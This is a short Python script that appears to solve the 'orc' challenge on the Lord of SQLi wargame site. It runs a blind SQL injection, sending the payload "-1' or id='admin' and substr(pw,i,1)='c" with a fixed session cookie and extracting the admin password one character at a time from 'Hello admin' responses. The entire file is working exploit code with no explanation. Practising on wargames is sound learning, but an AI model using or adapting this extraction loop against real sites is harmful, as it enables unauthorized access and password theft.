import requests


def blindi():
	password=""
	for i in range(1,9):
		print("progess : "+str(i))
		for guess in range(48,123):
			print("matching whth : "+chr(guess))
			URL="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=-1' or id='admin' and substr(pw,"+str(i)+",1)='"+chr(guess)
			cookies={'PHPSESSID':'2jmdje149iheon8es94327lllt'}
			response=requests.get(URL,cookies=cookies)
			if "Hello admin" in response.text:
				print("order : "+str(i)+", password : " + chr(guess))
				password+=chr(guess)
				break
	print("password : " +password)


if __name__ == "__main__":
	print("Program Start")
	blindi()

